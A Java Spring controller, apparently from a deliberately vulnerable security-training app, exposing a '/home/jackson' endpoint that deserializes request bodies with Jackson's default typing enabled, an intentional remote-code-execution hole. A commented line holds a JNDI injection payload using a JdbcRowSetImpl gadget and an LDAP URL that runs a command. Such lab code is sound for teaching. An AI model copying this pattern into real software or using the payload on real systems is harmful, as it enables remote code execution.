package org.bewhale.javasec.controller.componentsvul;

import com.fasterxml.jackson.databind.ObjectMapper;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
@RequestMapping("/home/jackson")
public class Jackson {

    @RequestMapping("")
    public String vul(@RequestBody String content) {
        try {
//            content = "[\"com.nqadmin.rowset.JdbcRowSetImpl\",{\"dataSourceName\":\"ldap://127.0.0.1:1389/Basic/Command/calc\",\"autoCommit\":\"true\"}]";

            ObjectMapper mapper = new ObjectMapper();
            mapper.enableDefaultTyping();
//            System.out.println(content);
            //mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);
            Object o = mapper.readValue(content, Object.class);
            mapper.writeValueAsString(o);
            return "解析成功！";
        } catch (Exception e) {
            e.printStackTrace();
            return e.toString();
        }
    }
}
